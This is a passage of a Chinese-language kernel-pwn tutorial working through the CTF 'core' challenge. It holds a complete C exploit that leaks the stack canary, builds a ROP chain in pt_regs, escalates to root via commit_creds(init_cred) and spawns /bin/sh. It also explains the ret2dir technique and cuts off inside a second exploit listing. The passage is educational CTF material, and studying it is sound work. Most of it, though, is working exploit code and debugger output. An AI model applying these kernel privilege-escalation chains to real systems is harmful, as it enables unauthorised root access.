class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0x00000000000006f0</span>;</span><br><span class="line">    rop[it++] = mov_cr4_rdi_ret;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-pt-regs-构造-kernel-ROP"><a href="#利用-pt-regs-构造-kernel-ROP" class="headerlink" title="利用 pt_regs 构造 kernel ROP"></a>利用 pt_regs 构造 kernel ROP</h2><p>查看<code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，注意到当程序进入到内核态时，该函数会将所有的寄存器压入内核栈上，形成一个 <code>pt_regs</code>结构体，该结构体实质上位于内核栈底，<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44" >定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>内核栈只有一个页面的大小，而 <code>pt_regs</code> 结构体则固定位于内核栈栈底，当我们劫持内核结构体中的某个函数指针时（例如 <code>seq_operations-&gt;start</code>），在我们通过该函数指针劫持内核执行流时 <code>rsp</code> 与 栈底的相对偏移通常是不变的。</p>
<p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 <code>r8 ~ r15</code>，这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：只需要寻找到一条形如 <code>&quot;add rsp, val ; ret&quot;</code> 的<code>gadget</code>便能够完成<code>ROP</code>，在进入内核态前像寄存器写入一些值，看那些寄存器可以被保留，以便后续写入<code>gadget</code>。</p>
<blockquote>
<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
</ul>
</blockquote>
<h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><p>这次我们限制溢出只能覆盖返回地址，此时需要栈迁移到其他地方构造 rop 。其中一个思路就是在 <code>pt_regs</code> 上构造 rop 。我们在调用 <code>core_copy_func</code> 函数之前先将寄存器设置为几个特殊的值，然后再 <code>core_copy_func</code> 函数的返回处下断点。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111111111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222222222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333333333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xbbbbbbbbbbbbbbbb;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0xffffffffffff0050;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure></div>

<p>数字没变的寄存器就是我们能够控制的。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0b:0058│     0xffffc90000113f58 ◂— 0x1111111111111111</span><br><span class="line">0c:0060│     0xffffc90000113f60 ◂— 0x2222222222222222 (<span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span>)</span><br><span class="line">0d:0068│     0xffffc90000113f68 ◂— 0x3333333333333333 (<span class="string">&#x27;33333333&#x27;</span>)</span><br><span class="line">0e:0070│     0xffffc90000113f70 ◂— 0x4444444444444444 (<span class="string">&#x27;DDDDDDDD&#x27;</span>)</span><br><span class="line">0f:0078│     0xffffc90000113f78 ◂— 0x5555555555555555 (<span class="string">&#x27;UUUUUUUU&#x27;</span>)</span><br><span class="line">10:0080│     0xffffc90000113f80 ◂— 0x6666666666666666 (<span class="string">&#x27;ffffffff&#x27;</span>)</span><br><span class="line">11:0088│     0xffffc90000113f88 ◂— 0x207</span><br><span class="line">12:0090│     0xffffc90000113f90 ◂— 0x8888888888888888</span><br><span class="line">13:0098│     0xffffc90000113f98 ◂— 0x9999999999999999</span><br><span class="line">14:00a0│     0xffffc90000113fa0 ◂— 0xaaaaaaaaaaaaaaaa</span><br><span class="line">15:00a8│     0xffffc90000113fa8 ◂— 0xffffffffffffffda</span><br><span class="line">16:00b0│     0xffffc90000113fb0 —▸ 0x401566 ◂— lea rax, [rip + 0xbb44]</span><br><span class="line">17:00b8│     0xffffc90000113fb8 ◂— 0xffffffffffff0050 /* <span class="string">&#x27;P&#x27;</span> */</span><br><span class="line">18:00c0│     0xffffc90000113fc0 ◂— 0x6677889a</span><br><span class="line">19:00c8│     0xffffc90000113fc8 ◂— 0x614d8e5400000004</span><br><span class="line">1a:00d0│     0xffffc90000113fd0 ◂— 0x10</span><br><span class="line">1b:00d8│     0xffffc90000113fd8 —▸ 0x401566 ◂— lea rax, [rip + 0xbb44]</span><br><span class="line">1c:00e0│     0xffffc90000113fe0 ◂— 0x33 /* <span class="string">&#x27;3&#x27;</span> */</span><br><span class="line">1d:00e8│     0xffffc90000113fe8 ◂— 0x207</span><br><span class="line">1e:00f0│     0xffffc90000113ff0 —▸ 0x7ffe1d48e620 ◂— 0x0</span><br><span class="line">1f:00f8│     0xffffc90000113ff8 ◂— 0x2b /* <span class="string">&#x27;+&#x27;</span> */</span><br></pre></td></tr></table></figure></div>

<h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a class="link"   target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中为系统调用栈添加了一个偏移值，这意味着 <code>pt_regs</code> 与我们触发劫持内核执行流时的栈间偏移值不再是固定值：</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span></span><br><span class="line"> #ifdef CONFIG_X86_64</span><br><span class="line"> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+    add_random_kstack_offset();</span></span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure></div>

<p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 <code>slide gadget</code> 来继续完成利用，不过稳定性也大幅下降了。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 由于这里用的是正常的 trap_frame 因此不需要 save_status 和伪造 trap_frame 。</span></span><br><span class="line"><span class="comment">    * 另外，前四个寄存器被我们布置gadget，所以从+8位置开始执行即可。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode+0x8;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行 <code>add_rsp_0xc8_pop*4_ret</code> 时栈布局，rsp抬高<code>0xc8+0x20</code>后 ret 会执行到我们的 <code>shellcode</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905115129293.png"
                      alt="image-20240905115129293"
                ></p>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><p>如果 <code>ptregs</code> 所在的内存被修改了导致最多只能控制 16 字节的内存我们可以利用 ret2dir 的利用方式将栈迁移至内核的线性映射区。不同版本内核的线性映射区可以从内核源码文档的<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.15.8/source/Documentation/x86/x86_64/mm.txt" >mm.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>查看。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240906090938018.png"
                      alt="image-20240906090938018"
                ></p>
<p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段，<a class="link"   target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >原论文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br> linux 系统有一部分物理内存区域同时映射到用户空间和内核空间的某个物理内存地址。一块区域叫做 direct mapping area，即内核的线性映射区。，这个区域映射了所有的物理内存。我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址在内核空间中访问到。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240410172028837.png"
                      alt="image-20240410172028837"
                ></p>
<p>但需要注意的是在新版的内核当中 direct mapping area 已经不再具有可执行权限，因此我们很难再在用户空间直接布置 shellcode 进行利用，但我们仍能通过在用户空间布置 ROP 链的方式完成利用。</p>
<h3 id="利用思路-5"><a href="#利用思路-5" class="headerlink" title="利用思路"></a>利用思路</h3><p>这题主要思路如下：</p>
<ol>
<li><p>使用 mmap 喷射大量内存，并在里面写上rop链。</p>
</li>
<li><p>将try_hit的地址传给rbp，再利用<code>leave;ret</code>进行栈迁移。</p>
</li>
<li><p>完成栈迁移，执行提权代码。</p>
</li>
</ol>
<p>返回用户空间在使用 <code>swapgs_restore_regs_and_return_to_usermode</code>  函数时应该注意，前面 pop 完寄存器之后除 iretq 需要的寄存器还剩 orig_rax 和 rdi ，为了缩短 rop 的长度，可以直接  retn 到 <code>swapgs_restore_regs_and_return_to_usermode + 27;</code>，不过 rop 接下来还要有 16 字节的填充来表示 orig_rax 和 rdi 的位置。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 